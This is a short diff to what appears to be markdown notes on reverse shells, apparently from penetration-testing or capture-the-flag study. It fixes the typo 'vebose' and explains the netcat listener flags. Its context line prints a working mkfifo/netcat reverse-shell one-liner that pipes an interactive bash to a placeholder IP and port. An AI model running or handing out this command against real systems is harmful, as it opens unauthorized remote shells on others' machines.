@@ -47,7 +47,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc [IP] [Port] > /tmp/f
 nc -lvnp [Port]
 ```
 - *-l* : specifies to listen
-- *-v* : more vebose
+- *-v* : more verbose
 - *-n* : disables DNS resolution and uses just IPs, to speed up the connection
 - *-p* : specifies the source port
 
